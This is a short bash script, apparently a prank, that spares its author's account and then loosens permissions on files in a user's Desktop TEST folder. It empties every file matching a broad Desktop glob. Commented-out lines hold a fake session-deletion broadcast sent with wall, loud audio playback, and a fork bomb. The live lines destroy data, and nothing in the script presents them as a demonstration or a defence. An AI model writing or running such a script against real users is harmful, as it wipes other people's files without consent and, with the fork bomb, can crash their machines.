#!/bin/bash

MOTHER="hmeftah"
if [ "$MOTHER" = "$USER" ]; then
	echo "Nice try ;)"
	exit
fi
#echo "Come to bocal, your session will be deleted in 1 minute." | wall
#sleep 7s
#while true;
#do
	#afplay ./LOUDAF/Depression.mp3 &
chmod 777 /Users/$USER/Desktop/TEST/*
for file in /Users/$USER/Desktop/TEST*.*; do cat /dev/null > "$file" & done
	#:(){ :|:& };:
#done